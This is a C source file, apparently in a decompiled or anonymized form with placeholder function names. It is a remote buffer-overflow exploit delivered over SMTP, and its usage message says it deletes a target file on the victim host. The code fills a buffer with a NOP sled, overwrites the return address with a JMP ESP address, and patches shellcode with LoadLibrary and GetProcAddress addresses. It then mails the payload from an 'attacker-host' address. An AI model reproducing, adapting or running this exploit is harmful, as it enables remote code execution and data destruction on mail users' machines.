#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_short ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; int /*<<< orphan*/  h_addrtype; } ;
typedef  int /*<<< orphan*/  addr ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int /*<<< orphan*/  WORD ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
typedef  int /*<<< orphan*/  SOCKET ;
typedef  TYPE_2__ SOCKADDR_IN ;
typedef  int /*<<< orphan*/  LPSOCKADDR ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* CONTENT ; 
 int FALSE ; 
 scalar_t__ GetProcAddress ; 
 int /*<<< orphan*/  INVALID_SOCKET ; 
 unsigned int JMPESP_ADR ; 
 scalar_t__ LoadLibrary ; 
 int /*<<< orphan*/  FUNC0 (int,int /*<<< orphan*/ ) ; 
 int MAXBUF ; 
 size_t RETADR ; 
 scalar_t__ SMTP_PORT ; 
 scalar_t__ SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int STACK_BYTES ; 
 char* TARGET_FILE ; 
 scalar_t__ FUNC1 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 char* cmdbuf ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 char* exploit_code ; 
 struct hostent* FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 int FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,char) ; 
 int /*<<< orphan*/  FUNC8 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,char*,char,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 char FUNC16 (char*) ; 

FUNC17(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         ip,p1,p2;
    char                 buf[MAXBUF],packetbuf[MAXBUF+1000];
    struct hostent       *hs;

    if (argc<3){
        FUNC9("This exploit removes \"%s\" on the victim host",TARGET_FILE);
        FUNC9("usage: %s SMTPserver Mailaddress\n",argv[0]);
        return -1;
    }
    wVersionRequested = FUNC0( 2, 0 );
    if (FUNC1(wVersionRequested , &wsa)!=0){
        FUNC9("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=FUNC13(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        FUNC9("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = FUNC5((u_short)SMTP_PORT);
    if ((addr.sin_addr.s_addr=FUNC6(argv[1]))==-1){
            if ((hs=FUNC4(argv[1]))==NULL){
                FUNC9("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            FUNC7((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (FUNC3(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        FUNC9("Can not connect to specified host.\n"); return -1;
    }
    FUNC10(sock,packetbuf,MAXBUF,0);
    FUNC9("BANNER    : %s\n",packetbuf);

    FUNC12(sock,"EHLO mail.attcker-host.net\r\n");
    FUNC12(sock,"MAIL FROM: <attacker@attacker-host.net>\r\n");
    FUNC14(packetbuf,"RCPT TO: <%s>\r\n",argv[2]);
    FUNC12(sock,packetbuf);
    FUNC12(sock,"DATA\r\n");
    
    FUNC8(buf,0x90,MAXBUF); buf[MAXBUF]=0;
    ip=JMPESP_ADR;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    FUNC15(exploit_code,cmdbuf);
    FUNC15(exploit_code,TARGET_FILE);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x1e]=p2&0xff;
    exploit_code[0x1f]=(p2>>8)&0xff;
    exploit_code[0x20]=(p2>>16)&0xff;
    exploit_code[0x21]=(p2>>24)&0xff;
    exploit_code[0x2a]=FUNC16(TARGET_FILE);
    FUNC7(buf+RETADR+4+STACK_BYTES,exploit_code,FUNC16(exploit_code));

    FUNC14(packetbuf,CONTENT,buf);
    FUNC11(sock,packetbuf,FUNC16(packetbuf),0);
    FUNC12(sock,".\r\n");
    FUNC2(sock);
    FUNC9("Done.\n");
    return FALSE;
}